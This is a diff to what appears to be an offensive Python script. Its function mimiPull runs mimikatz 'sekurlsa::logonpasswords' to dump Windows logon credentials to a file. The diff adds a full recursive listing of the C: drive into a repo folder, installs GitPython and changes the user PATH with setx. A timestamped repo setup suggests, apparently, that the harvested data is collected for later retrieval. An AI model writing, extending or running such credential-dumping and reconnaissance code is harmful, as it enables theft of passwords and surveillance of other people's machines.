@@ -27,9 +27,16 @@ def mimiPull():
         os.system("{} sekurlsa::logonpasswords > ".format(mimiPath) + lsass_dump_path)
         if os.path.exists(lsass_dump_path):
             print("mimikatz was used")
+    temp = os.popen("dir /s /b c:\ > {}\cdirsTest.txt".format(repo_dir)).read()
+    print("done")
 
 
 def repoName(temp_dir):
+    """
+    create a repo to handel the files
+    :param temp_dir:
+    :return:
+    """
     now = datetime.now()
     date_time = now.strftime("%m%d%Y%H%M%S")
     print("date and time:", date_time)
@@ -43,10 +50,14 @@ def install():
     :return:
     """
     try:
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "GitPython"])
-        print("git install successful")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "GitPython"])  # pip install the git library
+        temp = os.popen("python -m pip show gitpython | findstr Location").read()  # show the location of the library
+        splingLoc = temp.split()  # split the location
+        temp2 = os.popen(
+            'setx PATH "%PATH%;{}"'.format(splingLoc[1])).read()  # add the path to the enciorment variables
+        print(temp2)
     except Exception as e:
-        print(e)
+        print("error --------", e)
 
 
 # Press the green button in the gutter to run the script.
